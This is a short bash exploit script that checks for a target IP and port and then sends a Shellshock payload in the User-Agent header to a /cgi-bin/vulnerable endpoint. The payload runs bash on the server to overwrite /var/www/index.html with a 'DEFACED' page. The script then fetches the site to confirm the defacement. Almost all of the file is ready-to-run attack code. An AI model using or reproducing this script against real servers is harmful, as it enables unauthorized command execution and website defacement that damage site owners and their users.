#!/bin/bash

# Define a function to validate the arguments provided by the user
function validate_arguments() {
    if [ -z "$1" ]
    then
        echo -e "\e[31m[!] Please provide the IP and PORT of the target\e[0m"
        echo -e "\e[31m[!] Example: ./myexploit-shellshock.sh <ip> <port>\e[0m"
        return 1
    fi

    if [ -z "$2" ]
    then
        echo -e "\e[31m[!] Please provide the IP and PORT of the target\e[0m"
        echo -e "\e[31m[!] Example: ./myexploit-shellshock.sh <ip> <port>\e[0m"
        return 1
    fi

    return 0
}

# Define a function to send the exploit and test the defacement page
function send_exploit() {
    # Assign arguments to variables for later use
    target_ip=$1
    target_port=$2

    # Send the exploit to the remote web server via the CGI vulnerability using the "curl" command
    echo -e "\e[32m[+] Exploiting the target...\e[0m"
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://$target_ip:$target_port/cgi-bin/vulnerable && \

    # Check if the defacement page is deployed correctly on the remote web server using the "curl" command
    echo -e "\e[32m[+] Target exploited, testing defacement page deployment...\e[0m" && \
    curl http://$target_ip:$target_port

    # Display a message indicating that the exploit has completed successfully
    echo -e "\e[32m[+] Exploit completed successfully\e[0m"
    echo -e "	Now check your target: http://${target_ip}:${target_port}"
}

# Call the validate_arguments function with the user-provided arguments
validate_arguments "$1" "$2"

# If the arguments are valid, call the send_exploit function with the validated arguments
if [ $? -eq 0 ]
then
    send_exploit "$1" "$2"
fi
